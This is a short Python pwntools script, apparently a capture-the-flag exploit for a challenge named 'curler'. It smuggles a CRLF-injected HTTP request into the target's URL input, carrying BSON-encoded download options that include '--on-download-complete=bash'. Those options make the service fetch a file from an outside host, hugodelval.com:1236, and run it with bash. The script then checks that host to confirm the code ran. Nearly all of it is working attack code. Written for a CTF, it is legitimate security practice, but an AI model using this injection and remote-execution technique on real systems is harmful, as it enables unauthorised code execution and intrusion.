#!/usr/bin/env python3
import json
import requests
from pwn import *
import bson
import time


# conn = remote("localhost", 10001)
conn = remote("curler.ctf.insecurity-insa.fr", 10001)


def read_menu(conn):
    for _ in range(11):
        print(conn.readline())


print(conn.readline())
conn.readline()
conn.readline()
conn.readline()
conn.readline()
conn.readline()
print(conn.readline())
print(conn.readline())

read_menu(conn)
bson_params = bson.dumps({
    "options": ["--gid=aaaaaaaaaaaaaaaa", "--on-download-complete=bash"]
})
print(repr(bson_params))
params = json.dumps(bson_params.decode())[1:-1]
conn.sendline("2")
print(conn.readline())
payload = '"http://hugodelval.com:1236/aaaaaaaaaaaaaaaa HTTP/1.1\\r\\nContent-Length: {}\\r\\n\\r\\n{}"'.format(len(bson_params), params)
print(payload)
conn.sendline(payload)
print(conn.readline())
read_menu(conn)
conn.sendline("3")
print(conn.readline())
print(conn.readline())
print(conn.readline())
conn.readline()
conn.sendline("4")

time.sleep(2)
conn.close()

if int(requests.get("http://hugodelval.com:1236/last-time").text) < 60:
    exit(0)

exit(1)
